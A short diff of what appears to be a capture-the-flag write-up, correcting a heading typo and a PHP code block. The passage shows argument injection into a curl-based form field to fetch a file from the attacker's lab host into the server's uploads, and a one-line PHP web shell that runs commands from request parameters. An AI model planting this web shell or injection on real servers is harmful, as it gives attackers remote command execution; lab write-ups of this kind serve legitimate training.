@@ -52,7 +52,7 @@ By inputting anything into the field, we get the an error from `curl`:
 This means this sends a `curl` command to get the files and this is what we want to abuse.
 Lets send this to _Burpsuites Repeater_ to try some things with _cURL_.
 
-### Getting a revers shell
+### Getting a reverse shell
 
 We can try to put parameters of _cURL_ in there:
 ```markdown
@@ -67,7 +67,7 @@ formurl=-o uploads/test.html http://10.10.14.23:8000/test.html&submit=Go
 Requesting the test.html file we get it back, so we can upload a PHP file to get command execution.
 The web shell _shell.php_ file I will upload has this code in it:
 ```php
-<?php echo system($\_REQUEST['cmd']); ?>
+<?php echo system($_REQUEST['cmd']); ?>
 ```
 
 Now we can request the file with the command `whoami` to test it:
